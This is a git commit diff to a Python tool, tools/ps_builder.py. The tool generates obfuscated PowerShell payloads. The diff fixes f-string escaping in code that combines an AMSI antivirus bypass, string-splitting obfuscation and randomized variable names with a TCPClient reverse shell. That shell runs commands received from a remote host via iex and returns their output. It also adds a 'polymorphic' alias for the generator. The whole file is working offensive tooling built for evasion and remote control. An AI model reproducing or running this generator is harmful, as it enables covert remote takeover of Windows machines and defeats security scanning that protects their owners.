7bd57a38a837a33970bea51fd7e195a9bbd4801c
Edward Wolfgang <wolf@MacBook-Pro.local>
2025-05-19 23:33:19 -0700

    did not go crazy

--- tools/ps_builder.py
+++ tools/ps_builder.py
@@ -1,3 +1,4 @@
+
 import random
 import string
 import os
@@ -8,7 +9,7 @@ def rand_name(length=8):
 
 def split_string(s):
     # Splits a string into a "+"-joined sequence of chars for obfuscation
-    return '+'.join([f"\'{c}\'" for c in s])
+    return '+'.join([f"'{c}'" for c in s])
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     # Randomized variable names
@@ -17,25 +18,25 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     ]}
 
     # AMSI bypass with randomized names
-    amsi_bypass = f"""${var['amsi_type']} = {split_string('AMSI')};
-${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}${var['amsi_type']}+{split_string('Utils')});
-${var['amsi_failed']} = ${var['amsi_field']}.GetField(${var['amsi_type']}+{split_string('InitFailed')},'NonPublic,Static');
-${var['amsi_failed']}.SetValue($null,$true);"""
+    amsi_bypass = f"""${{var['amsi_type']}} = {split_string('AMSI')};
+${{var['amsi_field']}} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}${{var['amsi_type']}}+{split_string('Utils')});
+${{var['amsi_failed']}} = ${{var['amsi_field']}}.GetField(${{var['amsi_type']}}+{split_string('InitFailed')},'NonPublic,Static');
+${{var['amsi_failed']}}.SetValue($null,$true);"""
 
     # Reverse shell payload with split and randomized names
     ps = f"""
 {amsi_bypass}
 
-${var['tcpclient']} = New-Object ({split_string('System.Net.Sockets.TCPClient')})('{host}', {port});
-${var['stream']} = ${var['tcpclient']}.GetStream();
-${var['bytes']} = 0..65535|%{{0}};
-while((${var['i']} = ${var['stream']}.Read(${var['bytes']},0,${var['bytes']}.Length)) -ne 0){{
-    ${var['data']} = (New-Object -TypeName ({split_string('System.Text.ASCIIEncoding')})).GetString(${var['bytes']},0,${var['i']});
-    ${var['sendback']} = (iex ${var['data']} 2>&1 | Out-String );
-    ${var['sendback2']} = ${var['sendback']} + "PS " + (pwd).Path + "> ";
-    ${var['sendbyte']} = ([text.encoding]::ASCII).GetBytes(${var['sendback2']});
-    ${var['stream']}.Write(${var['sendbyte']},0,${var['sendbyte']}.Length);
-    ${var['stream']}.Flush();
+${{var['tcpclient']}} = New-Object ({split_string('System.Net.Sockets.TCPClient')})('{host}', {port});
+${{var['stream']}} = ${{var['tcpclient']}}.GetStream();
+${{var['bytes']}} = 0..65535|%{{0}};
+while((${{var['i']}} = ${{var['stream']}}.Read(${{var['bytes']}},0,${{var['bytes']}}.Length)) -ne 0){{
+    ${{var['data']}} = (New-Object -TypeName ({split_string('System.Text.ASCIIEncoding')})).GetString(${{var['bytes']}},0,${{var['i']}});
+    ${{var['sendback']}} = (iex ${{var['data']}} 2>&1 | Out-String );
+    ${{var['sendback2']}} = ${{var['sendback']}} + "PS " + (pwd).Path + "> ";
+    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{var['sendback2']}});
+    ${{var['stream']}}.Write(${{var['sendbyte']}},0,${{var['sendbyte']}}.Length);
+    ${{var['stream']}}.Flush();
 }}
 """.strip()
 
@@ -50,3 +51,6 @@ while((${var['i']} = ${var['stream']}.Read(${var['bytes']},0,${var['bytes']}.Len
         return filename
     else:
         return ps
+
+# Legacy alias for route compatibility
+generate_polymorphic_ps = generate_obfuscated_ps
